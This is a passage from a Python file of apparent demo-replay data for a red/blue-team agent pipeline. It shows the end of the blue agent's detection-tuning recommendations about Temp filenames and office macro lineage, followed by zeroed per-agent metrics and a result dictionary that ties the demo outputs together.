    "Add regex-based random filename detection in Temp for environments with SIEM regex support",
    "Expand selection_office_lineage to include LibreOffice and other macro-capable applications"
  ]
}
```"""

DEMO_METRICS = {
    "model": "demo-replay",
    "total_latency_ms": 0,
    "total_tokens": 0,
    "agents": [
        {"agent": "red_agent", "latency_ms": 0, "prompt_tokens": 0, "completion_tokens": 0},
        {"agent": "blue_agent", "latency_ms": 0, "prompt_tokens": 0, "completion_tokens": 0},
        {"agent": "response_agent", "latency_ms": 0, "prompt_tokens": 0, "completion_tokens": 0},
        {"agent": "verifier_agent", "latency_ms": 0, "prompt_tokens": 0, "completion_tokens": 0},
    ],
}

DEMO_INVOKE_RESULT = {
    "red_output": DEMO_RED_OUTPUT,
    "blue_output": DEMO_BLUE_OUTPUT,
    "response_output": DEMO_RESPONSE_OUTPUT,
    "verifier_output": DEMO_VERIFIER_OUTPUT,
    "metrics": DEMO_METRICS,
}